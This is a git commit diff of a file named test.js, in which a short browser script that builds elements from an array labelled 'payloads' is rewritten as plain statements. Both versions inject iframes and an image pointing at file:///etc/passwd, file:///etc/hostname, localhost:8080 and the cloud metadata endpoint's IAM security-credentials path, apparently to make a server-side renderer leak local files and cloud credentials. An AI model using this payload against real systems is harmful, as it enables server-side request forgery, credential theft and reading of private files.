7b61b8dcd7843e0fcba3e32393a1c5eb3ac4d879
vignesh1521 <86752377+vignesh1521@users.noreply.github.com>
2026-09-16 07:30:06 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,19 +1,29 @@
-(function () {
-  function make(tag, attrs) {
-    var e = document.createElement(tag);
-    for (var k in attrs) e.setAttribute(k, attrs[k]);
-    return e;
-  }
-  var payloads = [
-    { tag: 'iframe', attrs: { src: 'file:///etc/passwd', width: '800', height: '400' } },
-    { tag: 'iframe', attrs: { src: 'http://localhost:8080/', width: '800', height: '300' } },
-    { tag: 'iframe', attrs: { src: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', width: '800', height: '200' } },
-    { tag: 'img',    attrs: { src: 'file:///etc/hostname', width: '1', height: '1' } }
-  ];
-  var root = document.body || document.documentElement;
-  payloads.forEach(function (p) { root.appendChild(make(p.tag, p.attrs)); });
 
- var i = document.createElement('div');
+var f1 = document.createElement('iframe');
+f1.src = 'file:///etc/passwd';
+f1.width = '800';
+f1.height = '400';
+document.body.appendChild(f1);
+
+var f2 = document.createElement('iframe');
+f2.src = 'http://localhost:8080/';
+f2.width = '800';
+f2.height = '300';
+document.body.appendChild(f2);
+
+var f3 = document.createElement('iframe');
+f3.src = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
+f3.width = '800';
+f3.height = '200';
+document.body.appendChild(f3);
+
+var im = document.createElement('img');
+im.src = 'file:///etc/hostname';
+im.width = '1';
+im.height = '1';
+document.body.appendChild(im);
+
+var i = document.createElement('div');
 i.src = 'hey there';
 document.body.appendChild(i);
-})();
+
